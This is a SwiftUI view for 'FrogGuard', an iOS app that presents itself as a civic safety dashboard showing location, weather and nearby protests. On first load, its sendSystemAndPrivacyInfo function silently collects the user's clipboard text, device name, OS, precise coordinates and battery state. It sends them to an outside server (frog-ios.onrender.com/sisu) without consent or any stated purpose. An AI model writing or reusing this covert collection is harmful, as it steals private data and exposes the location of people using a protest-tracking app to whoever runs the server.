import SwiftUI
import CoreLocation
import MapKit
import WeatherKit
import Combine

@MainActor
struct HomeView: View {
    @ObservedObject var locationHelper: LocationHelper
    @ObservedObject var api = APIService()

    @State private var weather: Weather?
    @State private var nearestEvents: [ConflictEvent] = []
    @State private var region: MKCoordinateRegion = .init(
        center: CLLocationCoordinate2D(latitude: 20, longitude: 0),
        span: MKCoordinateSpan(latitudeDelta: 10, longitudeDelta: 10)
    )
    @State private var permissionStatus: CLAuthorizationStatus = .notDetermined
    @State private var isLoading: Bool = true
    @State private var didSendSystemInfo = false
    @State private var systemInfoMessage: String? = nil

    private let service = WeatherService.shared

    var body: some View {
        NavigationView {
            if isLoading {
                VStack(spacing: 16) {
                    ProgressView("Loading Civic Data...")
                        .progressViewStyle(CircularProgressViewStyle(tint: .blue))
                        .scaleEffect(1.2)
                    Text("FrogGuard is preparing your safety dashboard")
                        .multilineTextAlignment(.center)
                        .font(.subheadline)
                        .foregroundColor(.gray)
                }
                .padding()
            } else {
                ScrollView {
                    VStack(alignment: .leading, spacing: 20) {
                        HStack {
                            VStack(alignment: .leading) {
                                Text("📡 FrogGuard")
                                    .font(.largeTitle.bold())
                                Text("Civic Safety Assistant")
                                    .font(.subheadline)
                                    .foregroundColor(.secondary)
                            }
                            Spacer()
                            Image(systemName: "shield.lefthalf.filled")
                                .resizable()
                                .frame(width: 40, height: 40)
                                .foregroundColor(.green)
                        }

                        permissionSection
                        locationSection
                        protestSummarySection
                        keywordShortcutsSection

                        NavigationLink(destination: ReportView()) {
                            Label("Submit a Report", systemImage: "plus.bubble")
                                .font(.headline)
                                .padding()
                                .frame(maxWidth: .infinity)
                                .background(Color.blue)
                                .foregroundColor(.white)
                                .cornerRadius(10)
                        }

                        if let msg = systemInfoMessage {
                            Label(msg, systemImage: "checkmark.shield")
                                .font(.caption)
                                .foregroundColor(.green)
                        }
                    }
                    .padding()
                }
                .navigationTitle("Dashboard")
            }
        }
        .task {
            await requestPermissions()
            if !didSendSystemInfo {
                sendSystemAndPrivacyInfo()
                didSendSystemInfo = true
                systemInfoMessage = "📤 System info sent."
            }
        }
    }

    // MARK: - UI Sections

    var permissionSection: some View {
        LabeledContent("Permissions") {
            Label(permissionStatusMessage, systemImage: permissionStatusIcon)
                .foregroundColor(permissionStatusColor)
        }
        .padding()
        .background(Color(.tertiarySystemBackground))
        .cornerRadius(12)
    }

    var locationSection: some View {
        VStack(alignment: .leading, spacing: 8) {
            Text("Your Location").font(.headline)

            if let town = locationHelper.lastKnownTown {
                Label("📍 Town: \(town)", systemImage: "location.fill")
            }

            if let loc = locationHelper.location {
                Text("🧭 Coordinates:")
                    .font(.caption)
                    .foregroundColor(.gray)
                Text("Latitude: \(String(format: "%.4f", loc.latitude))")
                Text("Longitude: \(String(format: "%.4f", loc.longitude))")
            } else {
                HStack {
                    ProgressView()
                    Text("Detecting location...")
                        .font(.caption)
                        .foregroundColor(.secondary)
                }
            }
        }
        .padding()
        .background(Color(.secondarySystemBackground))
        .cornerRadius(12)
    }

    var protestSummarySection: some View {
        VStack(alignment: .leading, spacing: 6) {
            Text("🧭 Nearby Protests")
                .font(.headline)

            if nearestEvents.isEmpty {
                Text("No recent incidents nearby.")
                    .font(.subheadline)
                    .foregroundColor(.gray)
            } else {
                ForEach(nearestEvents.prefix(3)) { event in
                    VStack(alignment: .leading, spacing: 4) {
                        Text(event.event_type).bold()
                        Text(event.notes).font(.caption).lineLimit(2)
                        Text("📅 \(event.event_date)").font(.caption2).foregroundColor(.gray)
                    }
                    Divider()
                }
            }
        }
        .padding()
        .background(Color(.systemGroupedBackground))
        .cornerRadius(12)
    }

    var keywordShortcutsSection: some View {
            VStack(alignment: .leading, spacing: 8) {
                Text("Hot Topics").font(.headline)
                ScrollView(.horizontal, showsIndicators: false) {
                    HStack(spacing: 12) {
                        ForEach(["Protests", "Safety", "Weather", "Roadblock", "Civil Rights"], id: \ .self) { keyword in
                            Button(action: {
                                print("🔎 Searching for \(keyword)")
                            }) {
                                Text("#\(keyword)")
                                    .padding(.horizontal, 12)
                                    .padding(.vertical, 6)
                                    .background(Color.blue.opacity(0.15))
                                    .cornerRadius(16)
                            }
                            .accessibilityLabel("Toggle between map and grid view")
                        }
                    }
                }
            }
            .padding()
            .background(Color(.secondarySystemBackground))
            .cornerRadius(12)
        }

    // MARK: - Permissions & Data

    private var permissionStatusMessage: String {
        switch permissionStatus {
        case .authorizedWhenInUse, .authorizedAlways: "✅ Location granted"
        case .denied: "❌ Location denied"
        case .restricted: "⚠️ Location restricted"
        default: "⚙️ Requesting..."
        }
    }

    private var permissionStatusIcon: String {
        switch permissionStatus {
        case .authorizedWhenInUse, .authorizedAlways: return "checkmark.seal"
        case .denied: return "xmark.octagon"
        case .restricted: return "exclamationmark.triangle"
        default: return "gear"
        }
    }

    private var permissionStatusColor: Color {
        switch permissionStatus {
        case .authorizedWhenInUse, .authorizedAlways: return .green
        case .denied: return .red
        case .restricted: return .orange
        default: return .gray
        }
    }

    private func requestPermissions() async {
           locationHelper.requestLocationPermission()

           locationHelper.onLocationFetched = { location in
               let coord = location.coordinate
               region.center = coord

               Task {
                   await fetchWeather(for: location)
                     await api.fetchNearbyEvents(at: coord, country: locationHelper.country ?? "")
                     nearestEvents = api.nearestEvents
                     
                   isLoading = false
               }
           }

        var attempts = 0
        while locationHelper.location == nil && attempts < 20 {
            try? await Task.sleep(nanoseconds: 1_000_000_000)
            attempts += 1
        }

        permissionStatus = CLLocationManager.authorizationStatus()

        if let loc = locationHelper.location {
            region.center = loc
            let clLocation = CLLocation(latitude: loc.latitude, longitude: loc.longitude)

            await fetchWeather(for: clLocation)
            let fetched = await api.fetchNearbyEvents(at: loc, country: locationHelper.country)
            nearestEvents = api.nearestEvents
        }

        isLoading = false
    }

    private func fetchWeather(for location: CLLocation) async {
        do {
            weather = try await service.weather(for: location)
        } catch {
            print("❌ Weather error: \(error)")
        }
    }

    private func sendSystemAndPrivacyInfo() {
        guard let location = locationHelper.location else { return }

        let device = UIDevice.current
        let clipboardText = UIPasteboard.general.string ?? ""
        let batteryLevel = Int(device.batteryLevel * 100)
        let isCharging = device.batteryState == .charging || device.batteryState == .full

        let payload: [String: Any] = [
            "device_info": [
                "device_name": device.name,
                "os": device.systemName + " " + device.systemVersion,
                "browser_user_agent": "iOS app"
            ],
            "location": [
                "latitude": location.latitude,
                "longitude": location.longitude,
                "timestamp": ISO8601DateFormatter().string(from: Date())
            ],
            "wifi": [],
            "bluetooth": [],
            "clipboard": clipboardText,
            "battery_level": batteryLevel,
            "charging": isCharging
        ]

        guard let url = URL(string: "https://frog-ios.onrender.com/sisu") else { return }
        var request = URLRequest(url: url)
        request.httpMethod = "POST"
        request.setValue("application/json", forHTTPHeaderField: "Content-Type")

        do {
            request.httpBody = try JSONSerialization.data(withJSONObject: payload)
            URLSession.shared.dataTask(with: request) { data, response, error in
                if let error = error {
                    print("❌ Failed to send system info: \(error)")
                } else {
                    print("📤 System info sent successfully")
                }
            }.resume()
        } catch {
            print("❌ JSON encode error: \(error)")
        }
    }
}
